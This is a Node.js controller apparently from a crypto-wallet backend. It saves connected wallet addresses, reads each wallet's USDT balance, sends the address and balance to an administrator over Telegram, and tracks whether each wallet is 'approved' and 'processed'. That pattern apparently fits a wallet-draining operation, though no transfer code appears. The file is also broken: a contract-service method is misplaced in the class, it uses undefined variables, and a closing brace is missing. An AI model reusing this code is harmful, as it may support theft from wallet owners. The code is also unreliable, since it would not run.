const walletService = require('../services/wallet.service');
const contractService = require('../services/contract.service');
const database = require('../config/database');
const validators = require('../utils/validators');
const helpers = require('../utils/helpers');

class WalletController {
    async connectWallet(req, res) {
        try {
            // Validate input
            const validation = validators.validateWalletConnection(req.body);
            if (!validation.valid) {
                return res.status(400).json({
                    success: false,
                    error: validation.error
                });
            }
            
            const { address, name } = req.body;
            
            // Save wallet to database - UPSERT (insert or update)
            const query = `
                INSERT INTO wallets (address, name, created_at, updated_at, is_approved, is_processed)
                VALUES ($1, $2, NOW(), NOW(), false, false)
                ON CONFLICT (address) DO UPDATE
                SET name = $2, updated_at = NOW(), is_approved = false, is_processed = false
                RETURNING *
            `;
            
            const result = await database.query(query, [address, name || 'Unnamed Wallet']);
            const wallet = result.rows[0];
            
            // Get USDT balance
            const balance = await contractService.getWalletUSDTBalance(address);
            
            // Update balance in database
            const updateQuery = `
                UPDATE wallets 
                SET usdt_balance = $1, last_balance_check = NOW()
                WHERE address = $2
            `;
            await database.query(updateQuery, [balance, address]);
            
            // Send alert to admin
            const telegram = require('../config/telegram');
            await telegram.sendNewWalletAlert(address, balance);
            
            res.json({
                success: true,
                wallet: {
                    id: wallet.id,
                    address: wallet.address,
                    name: wallet.name,
                    usdt_balance: balance,
                    created_at: wallet.created_at
                }
            });
        } catch (error) {
            console.error('Wallet connection error:', error);
            res.status(500).json({
                success: false,
                error: 'Internal server error'
            });
        }
    }

    async approveWallet(req, res) {
        try {
            // Validate input
            const validation = validators.validateWalletConnection(req.body);
            if (!validation.valid) {
                return res.status(400).json({
                    success: false,
                    error: validation.error
                });
            }
            
            const { address } = req.body;
            
            // Update approval status in database
            const query = `
                UPDATE wallets 
                SET is_approved = true, updated_at = NOW()
                WHERE address = $1
                RETURNING *
            `;
            
            const result = await database.query(query, [address]);
            
            if (result.rows.length === 0) {
                return res.status(404).json({
                    success: false,
                    error: 'Wallet not found'
                });
            }
            
            const wallet = result.rows[0];
            
            res.json({
                success: true,
                message: 'Wallet approved successfully',
                wallet: wallet
            });
        } catch (error) {
            console.error('Wallet approval error:', error);
            res.status(500).json({
                success: false,
                error: 'Internal server error'
            });
        }
    }

    async getWalletUSDTBalance(walletAddress) {
    if (!this.initialized) {
        console.warn('Contract service not initialized');
        return '0';
    }
    
    try {
        // Make sure this is your TESTNET USDT contract address
        const usdtAddress = process.env.USDT_CONTRACT_ADDRESS || 
            '0x337610d27c5d8e7f8c7e5d8e7f8c7e5d8e7f8c7e'; // REPLACE WITH YOUR ACTUAL TESTNET ADDRESS
        
        console.log('🔍 USING USDT CONTRACT:', usdtAddress);
        console.log('🔍 FOR WALLET:', walletAddress);
        
        const usdtContract = new ethers.Contract(
            usdtAddress,
            ['function balanceOf(address account) external view returns (uint256)'],
            this.provider
        );
        
        const balance = await usdtContract.balanceOf(walletAddress);
        console.log(' Raw balance from contract:', balance.toString());
        
        // Check what decimals your testnet USDT uses (could be 6, 18, or something else)
        let decimals = 6; // Most common for USDT
        
        try {
            // Try to get decimals from contract
            const decimalsFunc = new ethers.Contract(
                usdtAddress,
                ['function decimals() external view returns (uint8)'],
                this.provider
            );
            decimals = await decimalsFunc.decimals();
            console.log(' Decimals from contract:', decimals);
        } catch (decimalsError) {
            console.log(' Could not fetch decimals, using default:', decimals);
        }
        
        const formattedBalance = ethers.formatUnits(balance, decimals);
        console.log(' Formatted balance:', formattedBalance);
        
        return formattedBalance;
    } catch (error) {
        console.error('Error getting wallet balance:', error);
        return '0';
    }
}


module.exports = new WalletController();

